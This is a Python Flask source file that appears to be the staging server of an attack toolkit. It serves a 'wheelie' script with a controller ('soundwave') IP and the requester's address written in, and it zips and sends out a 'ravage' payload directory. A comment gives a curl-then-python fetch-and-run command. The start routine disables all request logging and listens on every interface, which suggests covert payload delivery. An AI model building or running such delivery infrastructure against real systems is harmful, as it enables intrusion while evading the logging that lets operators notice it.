from flask import Flask, request
import zipfile
import os
import threading
import settings
import logging

app = Flask(__name__)

WEB_SERVER_PORT = '1337'
WHEELIE_PATH = os.path.join(os.path.dirname(__file__), '../wheelie/wheelie.py')
WHEELIE_SOUNDWAVE_IP_PLACEHOLDER = "'<>SOUNDWAVE_IP</>'"
WHEELIE_WEB_SEVER_PORT_PLACEHOLDER = "'<>WEB_SERVER_PORT</>'"
WHEELIE_RAVAGE_IP_PLACEHOLDER = "'<>RAVAGE_IP</>'"
RAVAGE_PATH = os.path.join(os.path.dirname(__file__), '../ravage')


@app.route('/')
def hello_world():
    return 'Hello world'


# curl localhost:1337/wheelie > wheelie.py; python3 wheelie.py
@app.route('/wheelie')
def wheelie():
    with open(WHEELIE_PATH) as fh:
        data = ''.join(fh.readlines())
    for s, r in (
            (WHEELIE_SOUNDWAVE_IP_PLACEHOLDER, f"'{settings.soundwave_ip}'"),
            (WHEELIE_WEB_SEVER_PORT_PLACEHOLDER, f"'{WEB_SERVER_PORT}'"),
            (WHEELIE_RAVAGE_IP_PLACEHOLDER, f"'{request.remote_addr}'")
    ):
        data = data.replace(s, r)

    return data


@app.route('/ravage')
def ravage():
    fn = 'ravage.zip'
    zf = zipfile.ZipFile(fn, 'w', zipfile.ZIP_DEFLATED)
    for root, dirs, files in os.walk(RAVAGE_PATH):
        for file in files:
            zf.write(os.path.join(root, file), arcname=os.path.join(os.path.relpath(root, RAVAGE_PATH), file))
    zf.close()

    with open(fn, 'rb') as fh:
        c = fh.read(1)
        data = b''
        while True:
            data += c
            if not c:
                break
            c = fh.read(1)
    os.unlink(fn)
    return data


def start():
    logging.getLogger('werkzeug').disabled = True
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'

    app.logger.disabled = True
    app.run(host='0.0.0.0', port=WEB_SERVER_PORT, debug=False)


def main():
    threading.Thread(target=start).start()


if __name__ == '__main__':
    main()